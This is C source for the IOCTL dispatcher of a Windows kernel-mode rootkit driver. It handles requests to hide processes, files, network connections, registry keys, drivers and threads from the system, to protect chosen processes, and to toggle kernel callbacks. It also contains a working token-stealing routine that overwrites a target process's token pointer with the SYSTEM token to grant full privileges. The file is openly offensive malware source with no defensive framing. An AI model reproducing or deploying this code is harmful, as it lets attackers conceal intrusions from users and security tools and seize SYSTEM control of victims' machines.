#include "..\..\includes\shared.h"

extern PDRIVER_OBJECT g_driver;

extern void process_init(void);
extern void process_cleanup(void);
extern NTSTATUS process_add(ULONG pid, PCWSTR name);
extern NTSTATUS process_remove(ULONG pid);
extern NTSTATUS process_list(PVOID buffer, ULONG size, PULONG needed);
extern ULONG process_count(void);
extern BOOLEAN process_is_hidden(ULONG pid);

extern void protect_init(void);
extern void protect_cleanup(void);
extern NTSTATUS protect_add(ULONG pid, PCWSTR name);
extern NTSTATUS protect_remove(ULONG pid);
extern NTSTATUS protect_list(PVOID buffer, ULONG size, PULONG needed);
extern ULONG protect_count(void);

extern void file_init(void);
extern void file_cleanup(void);
extern NTSTATUS file_add(PCWSTR path);
extern NTSTATUS file_remove(PCWSTR path);
extern NTSTATUS file_list(PVOID buffer, ULONG size, PULONG needed);
extern ULONG file_count(void);

extern void net_init(void);
extern void net_cleanup(void);
extern NTSTATUS net_add(pnet_request req);
extern NTSTATUS net_remove(pnet_request req);
extern NTSTATUS net_list(PVOID buffer, ULONG size, PULONG needed);
extern ULONG net_count(void);

extern void reg_init(void);
extern void reg_cleanup(void);
extern NTSTATUS reg_add(PCWSTR path);
extern NTSTATUS reg_remove(PCWSTR path);
extern NTSTATUS reg_list(PVOID buffer, ULONG size, PULONG needed);
extern ULONG reg_count(void);

extern void driver_hide_init(void);
extern void driver_hide_cleanup(void);
extern NTSTATUS driver_hide_add(PCWSTR name);
extern NTSTATUS driver_hide_remove(PCWSTR name);
extern NTSTATUS driver_hide_list(PVOID buffer, ULONG size, PULONG needed);
extern ULONG driver_hide_count(void);

extern void thread_init(void);
extern void thread_cleanup(void);
extern NTSTATUS thread_add(ULONG tid, ULONG owner_pid);
extern NTSTATUS thread_remove(ULONG tid);
extern NTSTATUS thread_list(PVOID buffer, ULONG size, PULONG needed);
extern ULONG thread_count(void);

extern void callback_init(void);
extern void callback_cleanup(void);
extern NTSTATUS callback_enable_reg(PDRIVER_OBJECT driver);
extern NTSTATUS callback_disable_reg(void);
extern NTSTATUS callback_enable_proc(void);
extern NTSTATUS callback_disable_proc(void);
extern NTSTATUS callback_enable_image(void);
extern NTSTATUS callback_disable_image(void);
extern ULONG callback_reg_active(void);
extern ULONG callback_proc_active(void);
extern ULONG callback_image_active(void);
extern NTSTATUS callback_get_proc_log(PVOID buffer, ULONG size, PULONG copied);
extern NTSTATUS callback_get_image_log(PVOID buffer, ULONG size, PULONG copied);
extern void callback_clear_proc_log(void);
extern void callback_clear_image_log(void);
extern ULONG callback_proc_log_count(void);
extern ULONG callback_image_log_count(void);

static NTSTATUS handle_process_ioctl(ULONG code, PVOID buffer, ULONG in_size, ULONG out_size, PIRP irp)
{
    NTSTATUS status = STATUS_SUCCESS;

    switch (code) {
    case ioctl_add_hidden_process: {
        pprocess_request pr = (pprocess_request)buffer;
        if (in_size < sizeof(process_request)) return STATUS_BUFFER_TOO_SMALL;
        status = process_add(pr->pid, pr->name);
        break;
    }
    case ioctl_remove_hidden_process: {
        pprocess_request pr = (pprocess_request)buffer;
        if (in_size < sizeof(process_request)) return STATUS_BUFFER_TOO_SMALL;
        status = process_remove(pr->pid);
        break;
    }
    case ioctl_list_hidden_processes: {
        ULONG needed = 0;
        status = process_list(buffer, out_size, &needed);
        if (NT_SUCCESS(status)) irp->IoStatus.Information = needed;
        break;
    }
    case ioctl_add_protected_process: {
        pprocess_request pr = (pprocess_request)buffer;
        if (in_size < sizeof(process_request)) return STATUS_BUFFER_TOO_SMALL;
        status = protect_add(pr->pid, pr->name);
        break;
    }
    case ioctl_remove_protected_process: {
        pprocess_request pr = (pprocess_request)buffer;
        if (in_size < sizeof(process_request)) return STATUS_BUFFER_TOO_SMALL;
        status = protect_remove(pr->pid);
        break;
    }
    case ioctl_list_protected_processes: {
        ULONG needed = 0;
        status = protect_list(buffer, out_size, &needed);
        if (NT_SUCCESS(status)) irp->IoStatus.Information = needed;
        break;
    }
    case ioctl_elevate_process: {
        pprocess_request pr = (pprocess_request)buffer;
        PEPROCESS target = NULL;
        PACCESS_TOKEN token = NULL;
        PEPROCESS system_proc = NULL;
        PACCESS_TOKEN system_token = NULL;
        if (in_size < sizeof(process_request)) return STATUS_BUFFER_TOO_SMALL;
        status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pr->pid, &target);
        if (!NT_SUCCESS(status)) break;
        status = PsLookupProcessByProcessId((HANDLE)4, &system_proc);
        if (!NT_SUCCESS(status)) {
            ObDereferenceObject(target);
            break;
        }
        system_token = PsReferencePrimaryToken(system_proc);
        if (system_token) {
            ULONG token_offset = 0;
            PUCHAR proc_bytes = (PUCHAR)target;
            ULONG i;
            token = PsReferencePrimaryToken(target);
            for (i = 0; i < 0x600; i += sizeof(PVOID)) {
                PVOID val = *(PVOID *)(proc_bytes + i);
                if (((ULONG_PTR)val & ~0xf) == ((ULONG_PTR)token & ~0xf)) {
                    token_offset = i;
                    break;
                }
            }
            if (token_offset != 0) {
                PVOID new_ref = (PVOID)((ULONG_PTR)system_token | ((ULONG_PTR)(*(PVOID *)(proc_bytes + token_offset)) & 0xf));
                *(PVOID *)(proc_bytes + token_offset) = new_ref;
            } else {
                status = STATUS_NOT_FOUND;
            }
            PsDereferencePrimaryToken(token);
            PsDereferencePrimaryToken(system_token);
        } else {
            status = STATUS_UNSUCCESSFUL;
        }
        ObDereferenceObject(system_proc);
        ObDereferenceObject(target);
        break;
    }
    case ioctl_hide_process_by_name: {
        pprocess_request pr = (pprocess_request)buffer;
        if (in_size < sizeof(process_request)) return STATUS_BUFFER_TOO_SMALL;
        status = process_add(0, pr->name);
        break;
    }
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
    }
    return status;
}

static NTSTATUS handle_file_ioctl(ULONG code, PVOID buffer, ULONG in_size, ULONG out_size, PIRP irp)
{
    NTSTATUS status = STATUS_SUCCESS;

    switch (code) {
    case ioctl_add_hidden_file: {
        pfile_request fr = (pfile_request)buffer;
        if (in_size < sizeof(file_request)) return STATUS_BUFFER_TOO_SMALL;
        status = file_add(fr->path);
        break;
    }
    case ioctl_remove_hidden_file: {
        pfile_request fr = (pfile_request)buffer;
        if (in_size < sizeof(file_request)) return STATUS_BUFFER_TOO_SMALL;
        status = file_remove(fr->path);
        break;
    }
    case ioctl_list_hidden_files: {
        ULONG needed = 0;
        status = file_list(buffer, out_size, &needed);
        if (NT_SUCCESS(status)) irp->IoStatus.Information = needed;
        break;
    }
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
    }
    return status;
}

static NTSTATUS handle_net_ioctl(ULONG code, PVOID buffer, ULONG in_size, ULONG out_size, PIRP irp)
{
    NTSTATUS status = STATUS_SUCCESS;

    switch (code) {
    case ioctl_add_hidden_connection: {
        pnet_request nr = (pnet_request)buffer;
        if (in_size < sizeof(net_request)) return STATUS_BUFFER_TOO_SMALL;
        status = net_add(nr);
        break;
    }
    case ioctl_remove_hidden_connection: {
        pnet_request nr = (pnet_request)buffer;
        if (in_size < sizeof(net_request)) return STATUS_BUFFER_TOO_SMALL;
        status = net_remove(nr);
        break;
    }
    case ioctl_list_hidden_connections: {
        ULONG needed = 0;
        status = net_list(buffer, out_size, &needed);
        if (NT_SUCCESS(status)) irp->IoStatus.Information = needed;
        break;
    }
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
    }
    return status;
}

static NTSTATUS handle_reg_ioctl(ULONG code, PVOID buffer, ULONG in_size, ULONG out_size, PIRP irp)
{
    NTSTATUS status = STATUS_SUCCESS;

    switch (code) {
    case ioctl_add_hidden_reg: {
        preg_request rr = (preg_request)buffer;
        if (in_size < sizeof(reg_request)) return STATUS_BUFFER_TOO_SMALL;
        status = reg_add(rr->path);
        break;
    }
    case ioctl_remove_hidden_reg: {
        preg_request rr = (preg_request)buffer;
        if (in_size < sizeof(reg_request)) return STATUS_BUFFER_TOO_SMALL;
        status = reg_remove(rr->path);
        break;
    }
    case ioctl_list_hidden_reg: {
        ULONG needed = 0;
        status = reg_list(buffer, out_size, &needed);
        if (NT_SUCCESS(status)) irp->IoStatus.Information = needed;
        break;
    }
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
    }
    return status;
}

static NTSTATUS handle_driver_ioctl(ULONG code, PVOID buffer, ULONG in_size, ULONG out_size, PIRP irp)
{
    NTSTATUS status = STATUS_SUCCESS;

    switch (code) {
    case ioctl_add_hidden_driver: {
        pdriver_request dr = (pdriver_request)buffer;
        if (in_size < sizeof(driver_request)) return STATUS_BUFFER_TOO_SMALL;
        status = driver_hide_add(dr->name);
        break;
    }
    case ioctl_remove_hidden_driver: {
        pdriver_request dr = (pdriver_request)buffer;
        if (in_size < sizeof(driver_request)) return STATUS_BUFFER_TOO_SMALL;
        status = driver_hide_remove(dr->name);
        break;
    }
    case ioctl_list_hidden_drivers: {
        ULONG needed = 0;
        status = driver_hide_list(buffer, out_size, &needed);
        if (NT_SUCCESS(status)) irp->IoStatus.Information = needed;
        break;
    }
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
    }
    return status;
}

static NTSTATUS handle_thread_ioctl(ULONG code, PVOID buffer, ULONG in_size, ULONG out_size, PIRP irp)
{
    NTSTATUS status = STATUS_SUCCESS;

    switch (code) {
    case ioctl_add_hidden_thread: {
        pthread_request tr = (pthread_request)buffer;
        if (in_size < sizeof(thread_request)) return STATUS_BUFFER_TOO_SMALL;
        status = thread_add(tr->tid, tr->owner_pid);
        break;
    }
    case ioctl_remove_hidden_thread: {
        pthread_request tr = (pthread_request)buffer;
        if (in_size < sizeof(thread_request)) return STATUS_BUFFER_TOO_SMALL;
        status = thread_remove(tr->tid);
        break;
    }
    case ioctl_list_hidden_threads: {
        ULONG needed = 0;
        status = thread_list(buffer, out_size, &needed);
        if (NT_SUCCESS(status)) irp->IoStatus.Information = needed;
        break;
    }
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
    }
    return status;
}

static NTSTATUS handle_callback_ioctl(ULONG code, PVOID buffer, ULONG in_size, ULONG out_size, PIRP irp)
{
    NTSTATUS status = STATUS_SUCCESS;

    UNREFERENCED_PARAMETER(in_size);
    switch (code) {
    case ioctl_enable_reg_callback:
        status = callback_enable_reg(g_driver);
        break;
    case ioctl_disable_reg_callback:
        status = callback_disable_reg();
        break;
    case ioctl_enable_proc_notify:
        status = callback_enable_proc();
        break;
    case ioctl_disable_proc_notify:
        status = callback_disable_proc();
        break;
    case ioctl_enable_image_notify:
        status = callback_enable_image();
        break;
    case ioctl_disable_image_notify:
        status = callback_disable_image();
        break;
    case ioctl_get_proc_log: {
        ULONG copied = 0;
        status = callback_get_proc_log(buffer, out_size, &copied);
        if (NT_SUCCESS(status)) irp->IoStatus.Information = copied;
        break;
    }
    case ioctl_get_image_log: {
        ULONG copied = 0;
        status = callback_get_image_log(buffer, out_size, &copied);
        if (NT_SUCCESS(status)) irp->IoStatus.Information = copied;
        break;
    }
    case ioctl_clear_proc_log:
        callback_clear_proc_log();
        break;
    case ioctl_clear_image_log:
        callback_clear_image_log();
        break;
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
    }
    return status;
}

static NTSTATUS handle_system_ioctl(ULONG code, PVOID buffer, ULONG in_size, ULONG out_size, PIRP irp)
{
    NTSTATUS status = STATUS_SUCCESS;

    UNREFERENCED_PARAMETER(in_size);
    switch (code) {
    case ioctl_get_status: {
        pstatus_response sr = (pstatus_response)buffer;
        if (out_size < sizeof(status_response)) return STATUS_BUFFER_TOO_SMALL;
        RtlZeroMemory(sr, sizeof(status_response));
        sr->hidden_process_count = process_count();
        sr->hidden_file_count = file_count();
        sr->hidden_net_count = net_count();
        sr->hidden_reg_count = reg_count();
        sr->hidden_driver_count = driver_hide_count();
        sr->hidden_thread_count = thread_count();
        sr->protected_process_count = protect_count();
        sr->proc_log_count = callback_proc_log_count();
        sr->image_log_count = callback_image_log_count();
        sr->process_hide_active = sr->hidden_process_count > 0 ? 1 : 0;
        sr->file_hide_active = sr->hidden_file_count > 0 ? 1 : 0;
        sr->net_hide_active = sr->hidden_net_count > 0 ? 1 : 0;
        sr->reg_hide_active = sr->hidden_reg_count > 0 ? 1 : 0;
        sr->driver_hide_active = sr->hidden_driver_count > 0 ? 1 : 0;
        sr->thread_hide_active = sr->hidden_thread_count > 0 ? 1 : 0;
        sr->protection_active = sr->protected_process_count > 0 ? 1 : 0;
        sr->reg_callback_active = callback_reg_active();
        sr->proc_notify_active = callback_proc_active();
        sr->image_notify_active = callback_image_active();
        irp->IoStatus.Information = sizeof(status_response);
        break;
    }
    case ioctl_ping:
        irp->IoStatus.Information = 0;
        break;
    case ioctl_flush_all:
        process_cleanup();
        process_init();
        protect_cleanup();
        protect_init();
        file_cleanup();
        file_init();
        net_cleanup();
        net_init();
        reg_cleanup();
        reg_init();
        driver_hide_cleanup();
        driver_hide_init();
        thread_cleanup();
        thread_init();
        callback_clear_proc_log();
        callback_clear_image_log();
        break;
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
    }
    return status;
}

NTSTATUS ioctl_dispatch(PDEVICE_OBJECT device, PIRP irp)
{
    PIO_STACK_LOCATION stack;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG code;
    PVOID buffer = NULL;
    ULONG in_size = 0, out_size = 0;
    ULONG func;

    UNREFERENCED_PARAMETER(device);
    stack = IoGetCurrentIrpStackLocation(irp);
    code = stack->Parameters.DeviceIoControl.IoControlCode;
    buffer = irp->AssociatedIrp.SystemBuffer;
    in_size = stack->Parameters.DeviceIoControl.InputBufferLength;
    out_size = stack->Parameters.DeviceIoControl.OutputBufferLength;

    func = (code >> 2) & 0xfff;
    if (func >= ctl_process && func < ctl_file)
        status = handle_process_ioctl(code, buffer, in_size, out_size, irp);
    else if (func >= ctl_file && func < ctl_net)
        status = handle_file_ioctl(code, buffer, in_size, out_size, irp);
    else if (func >= ctl_net && func < ctl_reg)
        status = handle_net_ioctl(code, buffer, in_size, out_size, irp);
    else if (func >= ctl_reg && func < ctl_driver)
        status = handle_reg_ioctl(code, buffer, in_size, out_size, irp);
    else if (func >= ctl_driver && func < ctl_thread)
        status = handle_driver_ioctl(code, buffer, in_size, out_size, irp);
    else if (func >= ctl_thread && func < ctl_callback)
        status = handle_thread_ioctl(code, buffer, in_size, out_size, irp);
    else if (func >= ctl_callback && func < ctl_system)
        status = handle_callback_ioctl(code, buffer, in_size, out_size, irp);
    else if (func >= ctl_system)
        status = handle_system_ioctl(code, buffer, in_size, out_size, irp);
    else
        status = STATUS_INVALID_DEVICE_REQUEST;

    irp->IoStatus.Status = status;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return status;
}
